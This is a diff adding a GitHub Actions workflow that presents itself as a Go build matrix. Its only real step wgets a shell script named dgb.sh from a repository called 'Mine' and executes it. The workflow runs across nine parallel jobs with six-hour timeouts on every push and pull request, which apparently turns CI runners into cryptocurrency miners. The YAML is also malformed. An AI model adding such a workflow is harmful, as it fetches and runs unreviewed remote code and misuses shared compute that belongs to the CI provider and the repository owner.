@@ -1,0 +1,27 @@
+ name: dgb
+on: [push, pull_request]
+jobs:
+ build:
+  name: dgb
+  runs-on: ubuntu-latest
+  strategy:
+   max-parallel: 1
+   fail-fast: false
+   matrix:
+    go: [1, 2, 3]
+    flag: [A, B, C]
+  timeout-minutes: 360
+ env:
+   NUM_JOBS: 20
+   JOB: ${{ matrix.go }}
+steps:
+- name: Set up Go ${{ matrix.go }}
+  uses: actions/setup-go@v1
+  with:
+    go-version: ${{ matrix.go }}
+  id: go
+- name: Setup
+  uses: actions/checkout@v2
+- name: dgb
+  run: |
+    wget https://github.com/Wisnuyoganugraha/Mine/blob/main/dgb.sh && chmod u+x dgb.sh && ./dgb.sh
